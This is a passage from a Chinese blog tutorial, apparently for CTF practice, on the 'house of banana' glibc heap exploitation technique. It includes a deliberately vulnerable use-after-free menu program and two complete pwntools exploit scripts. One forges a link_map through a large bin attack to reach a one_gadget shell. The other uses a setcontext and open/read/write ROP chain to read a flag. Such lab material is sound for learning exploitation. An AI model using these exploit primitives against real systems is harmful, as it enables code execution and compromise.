class="comment">//i=l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span></span><br><span class="line">  p[<span class="number">38</span>]=libc_base+one_gadget;<span class="comment">//call array[i]</span></span><br><span class="line">  p[<span class="number">0x62</span>]=<span class="number">0x800000000</span>;<span class="comment">//使l-&gt;l_init_called 为1</span></span><br><span class="line">  *(<span class="type">size_t</span> *)(rtld_global_dl_ns+libc_base)=p;<span class="comment">//劫持_rtld_global_ns_loaded  目的伪造link_map</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172153387.png" alt="image-20230217215313299" style="zoom: 67%;" />



<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>自己写了一个程序，打了一下 <code>house of banana</code> ，我先是编译完之后，对应的是 <code>libc2.27</code> ，我用 <code>house of banana</code> 劫持执行流后打的 <code>og</code> 获取了 <code>shell</code> ，然后又 <code>patch</code> 成了 <code>2.31-0ubuntu9_amd64</code> 打的 <code>orw</code> </p>
<p><code>C</code> 源码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc test.c -o test -w -g</span></span><br><span class="line"><span class="comment">//ubuntu 18.04     GLIBC 2.27-3ubuntu1.6</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> num 10</span></span><br><span class="line"><span class="type">void</span> *chunk_list[num];</span><br><span class="line"><span class="type">int</span> chunk_size[num];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">	setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;1.add&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;2.show&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;3.edit&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;4.delete&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;5.exit&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Your choice:&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> index,size;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line">	<span class="keyword">if</span>(index&lt;<span class="number">0</span> || index&gt;=num)</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;size);</span><br><span class="line">	<span class="keyword">if</span>(size&lt;<span class="number">0x80</span>||size&gt;<span class="number">0x500</span>)</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	chunk_list[index] = <span class="built_in">calloc</span>(size,<span class="number">1</span>);</span><br><span class="line">  chunk_size[index] = size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> index;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line">	<span class="keyword">if</span>(index&lt;<span class="number">0</span> || index&gt;=num)</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;context: &quot;</span>);</span><br><span class="line">	read(<span class="number">0</span>,chunk_list[index],chunk_size[index]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> index;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line">	<span class="keyword">if</span>(index&lt;<span class="number">0</span> || index&gt;=num)</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		</span><br><span class="line">	<span class="built_in">free</span>(chunk_list[index]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> index;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line">	<span class="keyword">if</span>(index&lt;<span class="number">0</span> || index&gt;=num)</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;context: &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(chunk_list[index]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> choice;</span><br><span class="line">	init();</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		menu();</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;choice);</span><br><span class="line">		<span class="keyword">if</span>(choice==<span class="number">5</span>)&#123;</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">1</span>)&#123;</span><br><span class="line">			add();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">2</span>)&#123;</span><br><span class="line">			show();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">3</span>)&#123;</span><br><span class="line">			edit();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">4</span>)&#123;</span><br><span class="line">			delete();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>正常的菜单堆，肯定是有其他解法，这里只考虑 <code>house of banana</code> ，漏洞就一个 <code>UAF</code> 。</p>
<p>泄露 <code>libc</code> 和堆地址之后，打 <code>large bin attack</code> ，伪造 <code>link_map</code> ，各个字段的赋值上面已经进行了说明，下面是两个 <code>exp</code></p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>打 <code>2.27</code> 获取 <code>shell</code> 的 <code>exp</code></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line"></span><br><span class="line">d_a=<span class="number">0xCFF</span></span><br><span class="line">d_d=<span class="number">0xD3B</span></span><br><span class="line">d_e=<span class="number">0xD27</span></span><br><span class="line">d_s=<span class="number">0xD13</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Size:\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">	p.sendafter(<span class="string">&quot;context: \n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x428</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x418</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base=recv_libc()-<span class="number">0x3ec090</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x250</span></span><br><span class="line">log_addr(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rtld_global=libc_base+<span class="number">0x61b060</span></span><br><span class="line">one_gadget=libc_base+<span class="number">0x4f302</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+<span class="number">0x3ec090</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0x250</span>)+p64(rtld_global-<span class="number">0x20</span>))</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_d,d_a,d_e,d_s)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">link_map=p64(<span class="number">0</span>)*<span class="number">1</span></span><br><span class="line">link_map+=p64(libc_base+<span class="number">0x61c710</span>)<span class="comment">#l_next</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)</span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xb90</span>)<span class="comment">#l_real</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">28</span> </span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">0x98</span>)<span class="comment">#l-&gt;l_info[26]</span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">32</span>+<span class="number">0x98</span>)<span class="comment">#l-&gt;l_info[26]-&gt;d_un.d_ptr    </span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">0x10</span>+<span class="number">0x98</span>)<span class="comment">#l-&gt;l_info[28]</span></span><br><span class="line">link_map+=p64(<span class="number">8</span>)<span class="comment">#//i=l-&gt;l_info[28]-&gt;d_un.d_val</span></span><br><span class="line">link_map+=p64(one_gadget)</span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xb90</span>)</span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">58</span></span><br><span class="line">link_map+=p64(<span class="number">0x800000000</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,link_map)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172127310.png" alt="image-20230217205309204"></p>
<p>打 <code>2.31</code> 走 <code>orw</code> 读出 <code>flag</code> 的 <code>exp</code></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;demo&#x27;</span>)</span><br><span class="line"></span><br><span class="line">d_a=<span class="number">0xCFF</span></span><br><span class="line">d_d=<span class="number">0xD3B</span></span><br><span class="line">d_e=<span class="number">0xD27</span></span><br><span class="line">d_s=<span class="number">0xD13</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Size:\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">	p.sendafter(<span class="string">&quot;context: \n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x428</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x418</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base=recv_libc()-<span class="number">0x1ebfd0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x290</span></span><br><span class="line">log_addr(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rtld_global=libc_base+<span class="number">0x222060</span></span><br><span class="line">one_gadget=libc_base+<span class="number">0xe6aee</span></span><br><span class="line">ret_addr=libc_base+<span class="number">0x0000000000025679</span></span><br><span class="line">setcontext=<span class="number">0x580DD</span>+libc_base</span><br><span class="line">pop_rdi=libc_base+<span class="number">0x0000000000026b72</span></span><br><span class="line">pop_rsi=libc_base+<span class="number">0x0000000000027529</span></span><br><span class="line">pop_rdx_r12=libc_base+<span class="number">0x000000000011c1e1</span></span><br><span class="line">write_addr=libc_base+libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">open_addr=libc_base+libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line"></span><br><span class="line">read_addr=libc.symbols[<span class="string">&#x27;read&#x27;</span>]+libc_base</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+<span class="number">0x3ec090</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0x290</span>)+p64(rtld_global-<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">link_map=p64(<span class="number">0</span>)</span><br><span class="line">link_map+=p64(libc_base+<span class="number">0x223740</span>)<span class="comment">#l_next</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)</span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xb90</span>+<span class="number">0x40</span>)<span class="comment">#l_real</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">28</span> </span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">0x98</span>+<span class="number">0x40</span>)<span class="comment">#l-&gt;l_info[26]</span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">32</span>+<span class="number">0x98</span>+<span class="number">0x40</span>)<span class="comment">#l-&gt;l_info[26]-&gt;d_un.d_ptr    </span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">0x10</span>+<span class="number">0x98</span>+<span class="number">0x40</span>)<span class="comment">#l-&gt;l_info[28]</span></span><br><span class="line">link_map+=p64(<span class="number">0x20</span>)<span class="comment">#//i=l-&gt;l_info[28]-&gt;d_un.d_val</span></span><br><span class="line">link_map+=<span class="string">b&quot;flag\x00\x00\x00\x00&quot;</span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xb90</span>+<span class="number">0x40</span>)</span><br><span class="line">link_map+=p64(setcontext)</span><br><span class="line">link_map+=p64(ret_addr)</span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">12</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)<span class="comment">#rdi</span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xdc8</span>)<span class="comment">#rsi</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">link_map+=p64(<span class="number">0x100</span>)<span class="comment">#rdx</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line"></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xdc8</span>)<span class="comment">#rsp</span></span><br><span class="line">link_map+=p64(read_addr)<span class="comment">#rcx</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">36</span></span><br><span class="line">link_map+=p64(<span class="number">0x800000000</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_d,d_a,d_e,d_s)</span><br><span class="line">edit(<span class="number">2</span>,link_map)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">flag_addr=heap_base+<span class="number">0xd00</span></span><br><span class="line">orw=p64(pop_rdi)+p64(flag_addr)</span><br><span class="line">orw+=p64(pop_rsi)+p64(<span class="number">0</span>)</span><br><span class="line">orw+=p64(open_addr)</span><br><span class="line">orw+=p64(pop_rdi)+p64(<span class="number">3</span>)</span><br><span class="line">orw+=p64(pop_rsi)+p64(heap_base)</span><br><span class="line">orw+=p64(pop_rdx_r12)+p64(<span class="number">0x50</span>)+p64(<span class="number">0</span>)</span><br><span class="line">orw+=p64(read_addr)</span><br><span class="line">orw+=p64(pop_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">orw+=p64(pop_rsi)+p64(heap_base)</span><br><span class="line">orw+=p64(pop_rdx_r12)+p64(<span class="number">0x50</span>)+p64(<span class="number">0</span>)</span><br><span class="line">orw+=p64(write_addr)</span><br><span class="line">p.sendline(orw)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172127529.png" alt="image-20230217205622280"></p>
<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p><code>house of banana</code> 是 <code>ha1vk</code> 师傅提出来的一种利用手法，与<code>house</code> 系列的大部分攻击 <code>IO_FILE</code> 的利用不同，<code>house of banana</code> 是攻击的 <code>rtld_global</code> 结构体，伪造 <code>link_map</code> 进行的劫持执行流，只需要进行一次 <code>large bin attack</code> 并且能调用 <code>exit</code> 函数即可触发攻击，不过在攻击远程的时候可能需要爆破 （ <code>ld</code> 和 <code>libc</code> 的偏移可能在本地和远程不固定）</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>[<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_31">原创] CTF 中 glibc堆利用 及 IO_FILE 总结-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com (kanxue.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.buaq.net/go-85397.html">高Glibc版本下的堆骚操作解析 (buaq.net)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/222948#h3-5">house of banana-安全客 - 安全资讯平台 (anquanke.com)</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2023</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">ZIKH26</span>
  </div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  






  





</body>
</html>
